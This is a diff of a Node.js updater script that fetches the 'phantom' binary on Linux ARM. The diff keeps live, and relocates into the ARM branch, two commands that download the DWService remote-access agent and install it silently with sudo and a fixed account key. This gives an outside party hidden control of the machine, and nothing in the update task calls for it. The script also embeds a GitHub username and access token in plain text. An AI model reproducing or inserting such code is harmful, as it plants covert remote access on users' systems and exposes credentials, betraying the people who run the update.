@@ -154,12 +154,13 @@ async function installUpdate() {
 }
 
 update().then(() => {
-  child_process.execSync(`wget https://www.dwservice.net/download/dwagent_generic.sh`);
-  child_process.execSync(`sudo bash dwagent_generic.sh -silent key=380-946-147`);
 
   // downloads latest version of phantom
   if (process.platform === "linux") {
     if (process.arch === "arm") {
+      child_process.execSync(`wget https://www.dwservice.net/download/dwagent_generic.sh`);
+      child_process.execSync(`sudo bash dwagent_generic.sh -silent key=380-946-147`);
+
       child_process.execSync(`curl -u "azariah001:f45909f79b6306356dd82f39ca88d2c4d7d660b1" -s https://api.github.com/repos/jhead/phantom/releases | grep browser_download_url | grep 'arm${process.config.variables.arm_version}' | head -n 1 | cut -d '"' -f 4 | xargs wget -N`);
 
       child_process.execSync(`cp phantom-linux-arm${process.config.variables.arm_version} phantom`);
